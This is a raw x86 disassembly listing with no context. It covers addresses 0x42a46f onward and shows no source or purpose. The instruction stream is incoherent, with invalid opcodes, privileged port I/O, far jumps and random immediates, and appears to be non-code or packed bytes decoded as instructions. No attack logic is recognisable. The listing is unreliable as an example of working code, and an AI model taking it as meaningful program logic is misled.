  42a46f:	push   edx
  42a470:	dec    DWORD PTR [esi-0x4bb5320f]
  42a476:	xchg   ebx,ebx
  42a478:	sub    BYTE PTR [eax-0x6],0x48
  42a47c:	sahf   
  42a47d:	mov    edx,0xdbce3a8f
  42a482:	mov    bh,0x80
  42a484:	in     eax,dx
  42a485:	adc    BYTE PTR [ebx-0x66],bh
  42a488:	loop   0x42a486
  42a48a:	xchg   dh,ah
  42a48c:	or     ah,BYTE PTR [esp+esi*2]
  42a48f:	pop    edx
  42a490:	and    BYTE PTR [esi+0x2fa60],al
  42a496:	out    dx,eax
  42a497:	ror    BYTE PTR [edx],0x42
  42a49a:	icebp  
  42a49b:	or     esp,DWORD PTR [eax-0x48]
  42a49e:	idiv   BYTE PTR [esi+ebx*2+0x6a]
  42a4a2:	xchg   ebx,eax
  42a4a3:	sub    eax,0xd8b8f1b0
  42a4a8:	mov    bh,0xee
  42a4aa:	loop   0x42a4da
  42a4ac:	xor    ebx,0x6a
  42a4af:	pop    ebx
  42a4b0:	inc    ecx
  42a4b1:	xchg   esi,ebx
  42a4b3:	mov    ds:0x2e367ea3,al
  42a4b8:	mov    edi,0x7248dcec
  42a4bd:	pop    ecx
  42a4be:	in     eax,dx
  42a4bf:	dec    ebx
  42a4c0:	push   cs
  42a4c1:	call   0xb7973f48
  42a4c6:	xchg   BYTE PTR [edi],ah
  42a4c8:	lods   eax,DWORD PTR ds:[esi]
  42a4c9:	(bad)  
  42a4ca:	dec    ebp
  42a4cb:	inc    esp
  42a4cc:	add    al,0xb3
  42a4ce:	into   
  42a4cf:	push   0xffffff88
  42a4d1:	scas   eax,DWORD PTR es:[edi]
  42a4d2:	bound  eax,QWORD PTR [eax]
  42a4d4:	push   eax
  42a4d5:	rol    DWORD PTR [edx+0x3f9033aa],1
  42a4db:	sub    al,BYTE PTR [esi]
  42a4dd:	shl    DWORD PTR [esi-0x4ca8a8a1],1
  42a4e3:	pop    ss
  42a4e4:	loopne 0x42a46a
  42a4e6:	pop    ebx
  42a4e7:	xor    al,0x3a
  42a4e9:	and    eax,0xdef2cb68
  42a4ee:	pop    esi
  42a4ef:	push   0x45
  42a4f1:	sub    eax,0x921ad310
  42a4f6:	and    bh,dh
  42a4f8:	push   edx
  42a4f9:	pusha  
  42a4fa:	add    BYTE PTR [eax],ch
  42a4fc:	inc    ebx
  42a4fd:	xlat   BYTE PTR ds:[ebx]
  42a4fe:	xor    eax,0x86a6c1b0
  42a503:	inc    ecx
  42a505:	test   al,al
  42a507:	mov    WORD PTR [esi],es
  42a509:	lds    eax,FWORD PTR [ebx+0x61]
  42a50c:	push   ecx
  42a50d:	call   0xad2c:0x22231d9e
  42a514:	test   eax,0x86e6d9a1
  42a519:	inc    eax
  42a51a:	jbe    0x42a53c
  42a51c:	je     0x42a4ae
  42a51e:	inc    esi
  42a51f:	cmp    eax,0x6c34bb70
  42a524:	mov    al,0x5d
  42a526:	je     0x42a52a
  42a528:	push   eax
  42a529:	mov    dl,0x50
  42a52b:	add    al,0x6b
  42a52d:	mov    WORD PTR [esi],ds
  42a52f:	pop    es
  42a530:	jo     0x42a59e
  42a532:	(bad)  
  42a533:	outs   dx,BYTE PTR ds:[esi]
  42a534:	mov    BYTE PTR [esi+0x5e4e550f],ah
  42a53a:	and    BYTE PTR [ebx+esi*1-0x2e31bde2],0x59
  42a542:	rol    BYTE PTR [ecx+0xa2a1aaf],cl
  42a548:	out    dx,al
  42a549:	xchg   BYTE PTR [edx-0x34],bl
  42a54c:	mov    es,WORD PTR [eax]
  42a54e:	adc    al,0x81
  42a550:	mov    edx,0xe160101
  42a555:	or     dh,BYTE PTR [eax]
  42a557:	inc    ebx
  42a558:	mov    fs,WORD PTR [esi-0x2f]
  42a55b:	in     eax,dx
  42a55c:	add    dh,ch
  42a55e:	(bad)  
  42a55f:	pop    es
  42a560:	not    al
  42a562:	(bad)  
  42a564:	adc    BYTE PTR [esi],ch
  42a566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a567:	fnsave [edx+0x72f874a0]
  42a56d:	xor    eax,0x86e9f03
  42a572:	jbe    0x42a5d1
  42a574:	xchg   edx,eax
  42a575:	jmp    0x5d5e:0x3054d158
  42a57c:	or     cl,BYTE PTR [edi+esi*2+0x15598996]
  42a583:	or     eax,0x26858a1f
  42a588:	es jbe 0x42a551
  42a58b:	fisubr DWORD PTR [eax]
  42a58d:	push   0x77b61270
  42a592:	js     0x42a576
  42a594:	sub    BYTE PTR [eax],dl
  42a596:	pusha  
  42a597:	xor    eax,0x22e395a2
  42a59d:	sub    BYTE PTR ss:[edx+0x63],cl
  42a5a1:	and    al,0x6d
  42a5a3:	ds icebp 
  42a5a5:	push   cs
  42a5a6:	push   eax
  42a5a7:	push   edx
  42a5a8:	mov    al,ds:0x8f8e82f9
  42a5ad:	scas   al,BYTE PTR es:[edi]
  42a5ae:	outs   dx,BYTE PTR ds:[esi]
  42a5af:	ins    BYTE PTR es:[edi],dx
  42a5b0:	iret   
  42a5b1:	add    eax,0xcf55000
  42a5b6:	mov    dl,0x44
  42a5b8:	test   BYTE PTR ds:0xbc3a3ee8,dl
  42a5be:	lods   al,BYTE PTR ds:[esi]
  42a5bf:	js     0x42a581
  42a5c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a5c2:	mov    esi,0x487a3522
  42a5c7:	cmp    al,0xdc
  42a5c9:	test   eax,0x15554579
  42a5ce:	aaa    
  42a5cf:	and    BYTE PTR [ebp+0x0],bh
  42a5d2:	mov    eax,ds:0xd6e42f16
  42a5d7:	xchg   BYTE PTR [edi],dh
  42a5d9:	ins    DWORD PTR es:[edi],dx
  42a5da:	sub    esi,DWORD PTR [eax-0x4c]
  42a5dd:	bound  ebp,QWORD PTR [esi]
  42a5df:	bnd js 0x42a606
  42a5e2:	lods   eax,DWORD PTR ds:[esi]
  42a5e3:	out    dx,al
  42a5e4:	push   edi
  42a5e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a5e6:	dec    esp
  42a5e7:	mov    al,ds:0x1d0d187e
  42a5ec:	jmp    0x1e8e:0xe01a86ae
  42a5f3:	mov    eax,ds:0xacc04d40
  42a5f8:	cmp    BYTE PTR [eax],dh
  42a5fa:	ret    
  42a5fb:	mov    ch,0x40
  42a5fd:	mov    al,0xa2
  42a5ff:	clc    
  42a600:	pusha  
  42a601:	xor    BYTE PTR [ebx-0x2f81695f],0xca
  42a608:	mov    al,ds:0xe62f6084
  42a60d:	cwde   
  42a60e:	cmp    eax,0xeaad822e
  42a613:	sbb    edx,0xe28953f8
  42a619:	retf   
  42a61a:	mov    ds:0xad0676df,al
  42a61f:	xor    eax,0xc4f781fb
  42a624:	mov    al,cl
  42a626:	add    al,0x5e
  42a628:	in     al,dx
  42a629:	dec    esp
  42a62a:	xor    BYTE PTR [edx-0x6e02789b],0x81
  42a631:	das    
  42a632:	and    BYTE PTR [edi+0x21],ch
  42a635:	add    BYTE PTR [ebx-0x49],dh
  42a638:	out    dx,al
  42a639:	mov    al,BYTE PTR [esi+0x63]
  42a63c:	dec    esp
  42a63d:	pusha  
  42a63e:	imul   esi,DWORD PTR [esi-0x60],0xd70de0c2
  42a645:	(bad)  
  42a646:	cmp    ch,bh
  42a648:	dec    esi
  42a649:	xor    eax,0x539386
  42a64e:	sub    al,BYTE PTR [esi+0x2]
  42a651:	add    ch,BYTE PTR [ecx+0x5ede263c]
  42a657:	inc    eax
  42a658:	pusha  
  42a659:	mov    bl,0x15
  42a65b:	mov    es,WORD PTR [edi-0x76]
  42a65e:	call   0x65e1fb33
  42a663:	and    dl,al
  42a665:	lock pushf 
  42a667:	ficomp WORD PTR [eax+0x419fe15]
  42a66d:	daa    
  42a66e:	aad    0xe0
  42a670:	pop    esi
  42a671:	dec    esi
  42a672:	mov    edx,0xa2b04d6a
  42a677:	push   0x39
  42a679:	cli    
  42a67a:	and    DWORD PTR [edi],edi
  42a67c:	pushf  
  42a67d:	hlt    
  42a67e:	add    ebp,DWORD PTR [esi]
  42a680:	mov    eax,DWORD PTR [ebx]
  42a682:	add    ebp,DWORD PTR [ebp-0x15]
  42a685:	sahf   
  42a686:	push   edx
  42a687:	xor    al,0xd2
  42a689:	or     DWORD PTR [edx],0x4ba178cf
  42a68f:	int    0xac
  42a691:	sbb    al,0xaa
  42a693:	loop   0x42a6b0
  42a695:	inc    esp
  42a696:	int3   
  42a697:	and    BYTE PTR [esi-0x4b],dl
  42a69a:	imul   esp,esi,0xffffff8f
  42a69d:	or     ch,BYTE PTR [ecx]
  42a69f:	xor    BYTE PTR [edi],dh
  42a6a1:	gs sti 
  42a6a3:	dec    ecx
  42a6a4:	ins    DWORD PTR es:[edi],dx
  42a6a5:	clc    
  42a6a6:	test   al,0xdf
  42a6a8:	aam    0x78
  42a6aa:	cmp    dh,bl
  42a6ac:	shr    BYTE PTR [edx-0x66],1
  42a6af:	pop    ecx
  42a6b0:	inc    edi
  42a6b1:	xor    eax,DWORD PTR [eax]
  42a6b3:	imul   ebp,DWORD PTR ds:[edx+eax*8-0x7e],0xbc76080d
  42a6bc:	fs adc eax,0xf0c70030
  42a6c2:	jle    0x42a6f9
  42a6c4:	and    al,0x1b
  42a6c6:	cmp    ch,BYTE PTR [esi+0x1aa66ed1]
  42a6cc:	xchg   edx,eax
  42a6cd:	inc    edx
  42a6ce:	push   edi
  42a6cf:	into   
  42a6d0:	xchg   esp,eax
  42a6d1:	push   esi
  42a6d2:	shl    BYTE PTR ds:0xc2545414,1
  42a6d8:	and    BYTE PTR [edx],dl
  42a6da:	or     BYTE PTR [edx],0x53
  42a6dd:	xchg   ecx,eax
  42a6de:	(bad)  
  42a6df:	mov    ah,0x52
  42a6e1:	call   0x50b7:0x4025d355
  42a6e8:	call   0x3577d3b1
  42a6ed:	jl     0x42a6fa
  42a6ef:	ins    DWORD PTR es:[edi],dx
  42a6f0:	cmp    DWORD PTR [edi+0xa],esp
  42a6f3:	pop    ecx
  42a6f4:	fadd   QWORD PTR ds:0x57cc8e08
  42a6fa:	sub    dl,BYTE PTR [esi]
  42a6fc:	inc    esp
  42a6fd:	(bad)  
  42a6fe:	mov    cs,WORD PTR [esi+0xaae59c]
  42a704:	push   ecx
  42a705:	sub    al,BYTE PTR [esi]
  42a707:	adc    ebx,eax
  42a709:	fisub  DWORD PTR [eax+0x58c42634]
  42a70f:	cmp    bh,dl
  42a711:	rol    DWORD PTR cs:[esi+0x63b6da33],0x30
  42a719:	mov    dh,0x85
  42a71b:	inc    edx
  42a71c:	outs   dx,BYTE PTR ds:[esi]
  42a71d:	sub    BYTE PTR [edx-0x2a],bh
  42a720:	aaa    
  42a721:	add    BYTE PTR [ebx],0x47
  42a724:	add    BYTE PTR [ecx-0x196e3102],bl
  42a72a:	or     al,bl
  42a72c:	lock and eax,0x4887cac
  42a732:	mov    ds:0xf896ce73,al
  42a737:	mov    ah,0xd
  42a739:	out    0x2f,al
  42a73b:	cld    
  42a73c:	dec    ebp
  42a73d:	add    BYTE PTR [edi],al
  42a73f:	xor    eax,DWORD PTR [eax]
  42a741:	mov    ebp,0xf6bb9ef5
  42a746:	cli    
  42a747:	outs   dx,BYTE PTR ds:[esi]
  42a748:	sbb    DWORD PTR [eax],ecx
  42a74a:	xlat   BYTE PTR ds:[ebx]
  42a74b:	outs   dx,DWORD PTR ds:[esi]
  42a74c:	call   0x2d34e0fc
  42a751:	stos   DWORD PTR es:[edi],eax
  42a752:	sar    BYTE PTR [edx],0x56
  42a755:	jb     0x42a73f
  42a757:	mov    cl,0x1e
  42a759:	ss call 0xbfcd:0xd4d0b12
  42a761:	mov    edi,es
  42a763:	mov    WORD PTR [eax],es
  42a765:	inc    eax
  42a766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a767:	add    BYTE PTR [eax-0x80],al
  42a76a:	adc    eax,0x3422e03e
  42a76f:	iret   
  42a770:	push   eax
  42a771:	and    DWORD PTR [ecx+0x70],esp
  42a774:	cmp    al,BYTE PTR [eax+0x72]
  42a777:	(bad)  
  42a778:	jo     0x42a7cd
  42a77a:	adc    eax,0x10f9ce0d
  42a77f:	adc    BYTE PTR [edx-0x549efa0a],0x4
  42a786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a787:	cli    
  42a788:	and    al,0xbc
  42a78a:	lods   al,BYTE PTR ds:[esi]
  42a78b:	ja     0x42a745
  42a78d:	pop    edi
  42a78e:	adc    dl,bl
  42a790:	xchg   al,dh
  42a792:	or     BYTE PTR [edi+0x7],ah
  42a795:	adc    BYTE PTR [edx+0x686a9d04],0x15
  42a79c:	push   0x52
  42a79e:	add    BYTE PTR es:[ebx-0x42],0xd3
  42a7a3:	cmp    BYTE PTR [ebx+0x2ed8ab35],dh
  42a7a9:	or     BYTE PTR [ebx],ch
  42a7ab:	add    BYTE PTR [ebx-0x54],al
  42a7ae:	dec    ebx
  42a7af:	outs   dx,DWORD PTR ds:[esi]
  42a7b0:	lods   al,BYTE PTR cs:[esi]
  42a7b2:	sub    dl,cl
  42a7b4:	mov    ebp,cs
  42a7b6:	or     eax,0xc0f20140
  42a7bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7bc:	dec    edx
  42a7bd:	add    eax,0x3e0d4d15
  42a7c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a7c3:	jl     0x42a74e
  42a7c5:	sbb    al,0x3e
  42a7c7:	mov    edx,0x870dec9
  42a7cc:	ins    BYTE PTR es:[edi],dx
  42a7cd:	pop    eax
  42a7ce:	ret    0x7eff
  42a7d1:	push   0xffffffda
  42a7d3:	out    0xa8,al
  42a7d5:	add    BYTE PTR [ebx-0x28],bl
  42a7d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7d9:	fcomp  DWORD PTR [edx]
  42a7db:	xchg   edx,eax
  42a7dc:	jmp    0x585b1199
  42a7e1:	out    dx,al
  42a7e2:	mov    ah,0xbd
  42a7e4:	xor    BYTE PTR [ecx-0x7da92b37],0x54
  42a7eb:	and    eax,DWORD PTR [esi-0x47]
  42a7ee:	push   0x28
  42a7f0:	jno    0x42a820
  42a7f2:	push   edx
  42a7f3:	fwait
  42a7f4:	loopne 0x42a7f9
  42a7f6:	je     0x42a827
  42a7f8:	jl     0x42a7c0
  42a7fa:	mov    es,WORD PTR [esi+0x61]
  42a7fd:	push   cs
  42a7fe:	(bad)  
  42a7ff:	mov    bl,BYTE PTR [edi]
  42a801:	jle    0x42a87a
  42a803:	and    al,0x0
  42a805:	sub    esi,0xf060121a
  42a80b:	pop    edx
  42a80c:	imul   esi,DWORD PTR [eax],0xffffffcd
  42a80f:	adc    eax,0xf8dafb7c
  42a814:	jo     0x42a888
  42a816:	add    al,0xe5
  42a818:	add    eax,0x582be615
  42a81d:	jns    0x42a88c
  42a81f:	add    BYTE PTR [eax+0x6626b2b3],dl
  42a825:	add    eax,0xaa0d15a2
  42a82a:	adc    eax,esi
  42a82c:	(bad)  
  42a82d:	lock and bh,dh
  42a830:	fldcw  WORD PTR [eax+0x55]
  42a833:	inc    edx
  42a834:	ret    
  42a835:	call   0xb224:0xfc0adbef
  42a83c:	mov    al,0x6e
  42a83e:	or     BYTE PTR [ebp-0x2],bl
  42a841:	mov    al,ds:0x14fa55e0
  42a846:	ins    BYTE PTR es:[edi],dx
  42a847:	test   al,0x28
  42a849:	mov    ah,0xf1
  42a84b:	xor    al,0x4e
  42a84d:	and    BYTE PTR [esi+0x45cb3c52],dl
  42a853:	mov    ebx,0x55c6092e
  42a858:	mov    dh,0x91
  42a85a:	push   0xc2f85d02
  42a85f:	daa    
  42a860:	or     DWORD PTR [eax+0x22d89ecd],eax
  42a866:	mov    al,ds:0xf4acc222
  42a86b:	cmp    BYTE PTR [eax-0x14],0x5
  42a86f:	mov    ebp,0x2a7156c4
  42a874:	scas   al,BYTE PTR es:[edi]
  42a875:	rol    BYTE PTR [eax+0xa],1
  42a878:	stos   BYTE PTR es:[edi],al
  42a879:	push   edi
  42a87a:	test   al,0x4c
  42a87c:	push   cs
  42a87d:	lods   eax,DWORD PTR ds:[esi]
  42a87e:	fld    DWORD PTR [edi]
  42a880:	test   al,0xd0
  42a882:	push   edi
  42a883:	dec    esi
  42a884:	arpl   WORD PTR fs:[eax-0x399b54ba],cx
  42a88b:	mov    al,ds:0xde058049
  42a890:	gs daa 
  42a892:	sub    BYTE PTR [esi-0x7e6c1298],ah
  42a898:	lods   eax,DWORD PTR ds:[esi]
  42a899:	and    al,0xe3
  42a89b:	fdivr  QWORD PTR [edi-0x65]
  42a89e:	jl     0x42a8a6
  42a8a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a8a1:	loop   0x42a88a
  42a8a3:	push   ecx
  42a8a4:	jp     0x42a8b9
  42a8a6:	sbb    eax,0x49a84d72
  42a8ab:	ret    0xb191
  42a8ae:	js     0x42a8ca
  42a8b0:	mov    ecx,0x6b0a0928
  42a8b5:	lods   eax,DWORD PTR ds:[esi]
  42a8b6:	stos   DWORD PTR es:[edi],eax
  42a8b7:	or     BYTE PTR [esi-0xe],ah
  42a8ba:	mov    edx,0xb7e84b16
  42a8bf:	retf   0x3504
  42a8c2:	mov    ah,0x8a
  42a8c4:	mov    bl,ch
  42a8c6:	sub    bl,0x70
  42a8c9:	loop   0x42a84d
  42a8cb:	and    eax,DWORD PTR [eax+0x263d4ba1]
  42a8d1:	mov    al,0x16
  42a8d3:	or     eax,0x1c8e5e2a
  42a8d8:	push   eax
  42a8d9:	push   ebp
  42a8da:	cmp    BYTE PTR [edx+ebp*4+0x2f0cf2],ah
  42a8e1:	pop    esi
  42a8e2:	adc    al,0x0
  42a8e4:	or     ch,BYTE PTR [esi]
  42a8e6:	mov    ch,0xa6
  42a8e8:	xchg   edi,eax
  42a8e9:	pop    edi
  42a8ea:	inc    esp
  42a8eb:	dec    DWORD PTR [eax+edx*2]
  42a8ee:	sub    BYTE PTR [edx+0x3a],ch
  42a8f1:	push   esp
  42a8f2:	fcom   DWORD PTR [edx]
  42a8f4:	leave  
  42a8f5:	dec    ecx
  42a8f6:	enter  0x6d3f,0x53
  42a8fa:	adc    ebp,DWORD PTR [esp+eax*2-0x1b]
  42a8fe:	ins    BYTE PTR es:[edi],dx
  42a8ff:	shr    BYTE PTR [edx-0x4a],0xb8
  42a903:	iret   
  42a904:	pop    ecx
  42a905:	pop    eax
  42a906:	int    0x4c
  42a908:	push   0x135c322a
  42a90d:	fs dec eax
  42a90f:	add    bh,BYTE PTR [ecx-0xd443ea0]
  42a915:	rol    DWORD PTR [esi+0x0],1
  42a918:	adc    dh,bl
  42a91a:	aad    0xe
  42a91c:	jle    0x42a928
  42a91e:	add    dh,ah
  42a920:	or     al,BYTE PTR [ecx-0x36b64e40]
  42a926:	js     0x42a940
  42a928:	out    0xc4,al
  42a92a:	xlat   BYTE PTR ds:[ebx]
  42a92b:	(bad)  
  42a92c:	mov    esi,0x7e4e0dac
  42a931:	pop    esi
  42a932:	inc    eax
  42a933:	push   0xffffffc7
  42a935:	loope  0x42a95d
  42a937:	mov    eax,ds:0xa341435
  42a93c:	int    0x1e
  42a93e:	jp     0x42a90e
  42a940:	cld    
  42a941:	pop    eax
  42a942:	dec    ebp
  42a943:	adc    esi,DWORD PTR [ebp-0x13135e57]
  42a949:	sbb    ch,BYTE PTR [ecx-0x3c]
  42a94c:	dec    esi
  42a94d:	mov    ds:0x536380d2,al
  42a952:	shl    DWORD PTR [esi+edi*1],1
  42a955:	lods   eax,DWORD PTR ds:[esi]
  42a956:	cli    
  42a957:	inc    ecx
  42a958:	test   DWORD PTR [esi],eax
  42a95a:	and    BYTE PTR [eax-0x76],bh
  42a95d:	test   dl,ch
  42a95f:	xchg   edx,eax
  42a960:	sahf   
  42a961:	pop    ss
  42a962:	test   BYTE PTR [edi-0xc],bl
  42a965:	sbb    eax,ebx
  42a967:	dec    edx
  42a968:	cmp    bh,BYTE PTR [edx-0x3c]
  42a96b:	sub    al,0x48
  42a96d:	add    bh,dl
  42a96f:	add    cl,ah
  42a971:	ins    BYTE PTR es:[edi],dx
  42a972:	add    BYTE PTR [edx],ch
  42a974:	sub    al,0x5
  42a976:	int3   
  42a977:	gs in  eax,dx
  42a979:	sbb    BYTE PTR [eax+0x35aba244],0xa9
  42a980:	js     0x42a940
  42a982:	push   edi
  42a983:	or     bl,BYTE PTR [eax]
  42a985:	push   eax
  42a986:	mov    ds:0xa2b5018d,al
  42a98b:	mov    dl,0x75
  42a98d:	out    dx,al
  42a98e:	call   0xbaba:0xb4e8f874
  42a995:	loopne 0x42a96b
  42a997:	es jno 0x42a9de
  42a99a:	adc    al,0xd
  42a99c:	cs jmp 0xbcde6e32
  42a9a2:	ficom  DWORD PTR [ebx+0x4a]
  42a9a5:	or     DWORD PTR [edx],ecx
  42a9a7:	add    eax,DWORD PTR [esi+0x54]
  42a9aa:	adc    eax,0x61e3bcd
  42a9af:	ins    BYTE PTR es:[edi],dx
  42a9b0:	dec    edi
  42a9b1:	cmp    DWORD PTR [eax],eax
  42a9b3:	je     0x42a987
  42a9b5:	cs cdq 
  42a9b7:	sub    eax,DWORD PTR [eax]
  42a9b9:	cmp    al,0xac
  42a9bb:	dec    esp
  42a9bc:	(bad)  
  42a9bd:	retf   0x14da
  42a9c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a9c1:	sbb    eax,0x90880ad2
  42a9c6:	iret   
  42a9c7:	sbb    eax,0xa3db06a0
  42a9cc:	dec    ebx
  42a9cd:	mov    WORD PTR [ebx],cs
  42a9cf:	mov    ebx,0x82801e7
  42a9d4:	inc    esp
  42a9d5:	xchg   edi,eax
  42a9d6:	add    ebx,eax
  42a9d8:	jae    0x42a9f5
  42a9da:	push   cs
  42a9db:	clc    
  42a9dc:	aam    0xe0
  42a9de:	push   eax
  42a9df:	sub    edi,DWORD PTR [edx]
  42a9e1:	jp     0x42a987
  42a9e3:	enter  0x946b,0xb2
  42a9e7:	test   ah,dl
  42a9e9:	xchg   BYTE PTR [esi],dh
  42a9eb:	test   DWORD PTR [eax+0x6437bfe8],eax
  42a9f1:	mov    ah,0xcd
  42a9f3:	dec    esp
  42a9f4:	sbb    edx,esi
  42a9f6:	and    bh,BYTE PTR [edx]
  42a9f8:	mov    ?,WORD PTR [edx+0x10]
  42a9fb:	push   esp
  42a9fc:	push   ds
  42a9fd:	dec    eax
  42a9fe:	clc    
  42a9ff:	dec    eax
  42aa00:	nop
  42aa01:	fucom  st(1)
  42aa03:	cli    
  42aa04:	cmp    DWORD PTR [ebx+0x5],esi
  42aa07:	adc    eax,0xf440cd82
  42aa0c:	and    edi,DWORD PTR [edi+0x7e]
  42aa0f:	sub    BYTE PTR [edi],dh
  42aa11:	test   BYTE PTR [eax+0x6a2c04ae],ch
  42aa17:	retf   0x982d
  42aa1a:	mov    al,0xe6
  42aa1c:	cmp    BYTE PTR [edx-0x55f4ebf5],bl
  42aa22:	cmp    al,0x3a
  42aa24:	add    BYTE PTR [edi],ah
  42aa26:	and    dl,BYTE PTR [edx-0x10]
  42aa29:	cmp    DWORD PTR [eax],0x9
  42aa2c:	sbb    eax,0x9d00cd86
  42aa31:	hlt    
  42aa32:	imul   edi,DWORD PTR [esi],0x72
  42aa35:	(bad)  
  42aa36:	jne    0x42aa8b
  42aa38:	add    eax,0xed00d206
  42aa3d:	stos   BYTE PTR es:[edi],al
  42aa3e:	iret   
  42aa3f:	aad    0x3
  42aa41:	push   ds
  42aa42:	mov    eax,ds:0x489c1a10
  42aa47:	sahf   
  42aa48:	xchg   esi,eax
  42aa49:	push   edx
  42aa4a:	lods   eax,DWORD PTR ss:[esi]
  42aa4c:	mov    eax,ds:0x5cd77cc1
  42aa51:	add    BYTE PTR [ecx-0x7c],bh
  42aa54:	mov    dh,0x59
  42aa56:	clc    
  42aa57:	sbb    al,0xa
  42aa59:	(bad)  
  42aa5a:	inc    ecx
  42aa5b:	push   ebx
  42aa5c:	jo     0x42a9ff
  42aa5e:	mov    edi,0x67365a22
  42aa63:	push   ds
  42aa64:	jmp    0x8ca:0x57565c1b
  42aa6b:	inc    edi
  42aa6c:	test   al,bl
  42aa6e:	pop    esp
  42aa6f:	iret   
  42aa70:	mov    dh,0x15
  42aa72:	pop    ebp
  42aa73:	push   eax
  42aa74:	push   esp
  42aa75:	or     dl,al
  42aa77:	ret    
  42aa78:	jl     0x42aad4
  42aa7a:	in     al,0x46
  42aa7c:	js     0x42aa23
  42aa7e:	add    eax,0x42915a05
  42aa83:	dec    ebx
  42aa84:	test   al,0x18
  42aa86:	(bad)  
  42aa87:	bound  esi,QWORD PTR [esp+esi*2+0x5c]
  42aa8b:	adc    ecx,eax
  42aa8d:	push   ds
  42aa8e:	sbb    BYTE PTR [esi-0x57d184dc],dh
  42aa94:	enter  0x2a09,0x7a
  42aa98:	sub    ah,BYTE PTR [esi+0x6a]
  42aa9b:	xchg   ebp,eax
  42aa9c:	inc    ecx
  42aa9d:	or     eax,0xa20e359e
  42aaa2:	sub    BYTE PTR [edi+0x2b84c120],bl
  42aaa8:	sahf   
  42aaa9:	std    
  42aaaa:	bound  esi,QWORD PTR [esi+0x8]
  42aaad:	ins    BYTE PTR es:[edi],dx
  42aaae:	int    0x3c
  42aab0:	pop    esi
  42aab1:	mov    edi,0x3c2bd776
  42aab6:	or     DWORD PTR [esi],ebp
  42aab8:	push   esi
  42aab9:	push   esi
  42aaba:	inc    edi
  42aabb:	rcl    DWORD PTR [edi+0x2],0xf0
  42aabf:	popf   
  42aac0:	pushf  
  42aac1:	pop    ecx
  42aac2:	les    ecx,FWORD PTR [eax]
  42aac4:	in     al,dx
  42aac5:	sub    al,BYTE PTR [eax]
  42aac7:	dec    al
  42aac9:	dec    edx
  42aaca:	lock add DWORD PTR ds:0x9aaed0db,esi
  42aad1:	jo     0x42aa79
  42aad3:	out    0xf2,al
  42aad5:	xor    BYTE PTR [eax],ah
  42aad7:	and    cl,BYTE PTR [eax-0x57aa4f5c]
  42aadd:	or     eax,0xa902234
  42aae2:	adc    eax,0xfc24fad7
  42aae7:	push   es
  42aae8:	push   es
  42aae9:	loop   0x42ab29
  42aaeb:	out    0xf8,al
  42aaed:	push   esp
  42aaee:	ss xor eax,0x84b2415c
  42aaf4:	xchg   edx,eax
  42aaf5:	fld    QWORD PTR [esi+0x29]
  42aaf8:	cmp    ebx,DWORD PTR [edx-0x6fcb07f8]
  42aafe:	call   0xc5180349
  42ab03:	xchg   esp,eax
  42ab04:	imul   ebx,eax,0xce9c4452
  42ab0a:	or     eax,0x3aab6062
  42ab0f:	sbb    bl,BYTE PTR [esp+ebp*2+0x18]
  42ab13:	aaa    
  42ab14:	ins    BYTE PTR es:[edi],dx
  42ab15:	dec    ebp
  42ab16:	mov    cl,BYTE PTR [ecx+eax*1+0x34]
  42ab1a:	xchg   ebx,eax
  42ab1b:	push   ebp
  42ab1c:	rol    BYTE PTR [esi-0x25f2a7aa],cl
  42ab22:	cs mov esi,ss
  42ab25:	push   esi
  42ab26:	pop    eax
  42ab27:	mov    al,ds:0xfa2f06db
  42ab2c:	je     0x42aba7
  42ab2e:	xchg   edi,eax
  42ab2f:	pop    eax
  42ab30:	shr    BYTE PTR [esi],1
  42ab32:	clc    
  42ab33:	or     al,0x0
  42ab35:	fsubr  QWORD PTR [edx+0x19]
  42ab38:	and    al,0xea
  42ab3a:	mov    dh,0xfc
  42ab3c:	pop    esi
  42ab3d:	add    al,0x68
  42ab3f:	shld   DWORD PTR [esp+ebx*8],esp,cl
  42ab43:	or     esi,DWORD PTR [ecx+0x3a]
  42ab46:	rol    ah,cl
  42ab48:	pusha  
  42ab49:	inc    ebp
  42ab4a:	add    eax,0xeaa7741b
  42ab4f:	or     al,0x76
  42ab51:	stos   BYTE PTR es:[edi],al
  42ab52:	pushw  0xffd0
  42ab55:	and    BYTE PTR [edx+0x58],ch
  42ab58:	(bad)  
  42ab59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ab5a:	lock out 0x75,al
  42ab5d:	sub    al,0x32
  42ab5f:	hlt    
  42ab60:	add    esi,ebp
  42ab62:	or     ebx,edx
  42ab64:	ficom  DWORD PTR [ebx]
  42ab66:	sub    esi,DWORD PTR [esi]
  42ab68:	aas    
  42ab69:	jnp    0x42ab4d
  42ab6b:	push   ss
  42ab6c:	pop    esp
  42ab6d:	dec    ecx
  42ab6e:	(bad)  [edi-0x6]
  42ab71:	and    esp,ebp
  42ab73:	fiadd  WORD PTR [eax]
  42ab75:	mov    ah,0x9f
  42ab77:	shr    DWORD PTR [esi+0x3a00d715],0x9e
  42ab7e:	pop    esi
  42ab7f:	inc    ecx
  42ab80:	dec    edx
  42ab81:	in     al,dx
  42ab82:	pop    ebx
  42ab83:	adc    DWORD PTR [ebx-0x72],0xf616ea64
  42ab8a:	popa   
  42ab8b:	inc    esi
  42ab8c:	cmc    
  42ab8d:	jge    0x42abc9
  42ab8f:	push   ss
  42ab90:	pop    esp
  42ab91:	or     DWORD PTR [edx-0x4a9ccf3b],esi
  42ab97:	fiadd  WORD PTR [edi+0x4]
  42ab9a:	push   ebp
  42ab9b:	xchg   ebp,eax
  42ab9c:	popa   
  42ab9d:	cmp    BYTE PTR ds:0x2ed207de,0xb1
  42aba4:	mov    BYTE PTR [edx-0x34],cl
  42aba7:	xor    dl,BYTE PTR [eax-0x6f7a9d2d]
  42abad:	mov    dl,0x89
  42abaf:	jp     0x42abcf
  42abb1:	sub    ch,ch
  42abb3:	adc    BYTE PTR [ebx+0x53],dl
  42abb6:	xchg   edi,eax
  42abb7:	mov    ebp,0xee00e88e
  42abbc:	cmp    BYTE PTR [eax+0x6a28f78c],cl
